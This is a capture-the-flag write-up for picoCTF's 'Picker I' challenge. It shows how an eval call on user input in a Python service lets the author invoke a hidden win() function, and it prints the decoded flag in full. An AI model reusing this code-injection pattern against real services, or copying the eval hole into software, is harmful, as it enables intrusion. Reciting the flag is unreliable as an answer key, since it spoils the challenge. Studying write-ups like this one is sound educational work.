# Description
This service can provide you with a random number, but can it do anything else?
Connect to the program with netcat:
$ nc saturn.picoctf.net 63468
The program's source code can be downloaded here.

# Provided
- [picker-I.py](.prov/400-picker-I.py)

# Progress
First of all I try to connect and see what my options are:
~~~
Try entering "getRandomNumber" without the double quotes...
==>
~~~
Let's see:
~~~
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4
Try entering "getRandomNumber" without the double quotes...
==> 2
'int' object is not callable
Try entering "getRandomNumber" without the double quotes...
==> asd
name 'asd' is not defined
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4
Try entering "getRandomNumber" without the double quotes...
==>
~~~
The RandomNumber seems to be always 4, i wonder if that has to do with anything...<br>
Other inputs seem to do nothing. Time to look at the code
~~~python
def getRandomNumber():
print(4)  # Chosen by fair die roll.
          # Guaranteed to be random.
          # (See XKCD)
~~~
![](https://imgs.xkcd.com/comics/random_number.png)

Well i guess that explain that.

~~~python
def esoteric1():
  esoteric = \
  '''
  int query_apm_bios(void)
{

  ...
  
  '''
  print(esoteric)
~~~
This is.... c code in a python script... assigned as a string to a variable.... that gets printed at the end....<br>
Well... considering the name i think i will ignore this and the 2nd one for now. They seem to be flavor to bloat the script.
~~~python
while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
~~~
That's the Part i was looking for:
~~~
eval(user_input + '()')
~~~
So you can call any function in the script.... TIme to look for the flag:
~~~python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
~~~
There it is... So if i enter `win` i should get the flag
~~~
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d
~~~
Hex encoded.... [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg3MCAweDY5IDB4NjMgMHg2ZiAweDQzIDB4NTQgMHg0NiAweDdiIDB4MzQgMHg1ZiAweDY0IDB4MzEgMHgzNCAweDZkIDB4MzAgMHg2ZSAweDY0IDB4NWYgMHgzMSAweDZlIDB4NWYgMHgzNyAweDY4IDB4MzMgMHg1ZiAweDcyIDB4MzAgMHg3NSAweDY3IDB4NjggMHg1ZiAweDM2IDB4NjUgMHgzMCAweDM0IDB4MzQgMHgzNCAweDMwIDB4NjQgMHg3ZA) it is:<br>
picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}
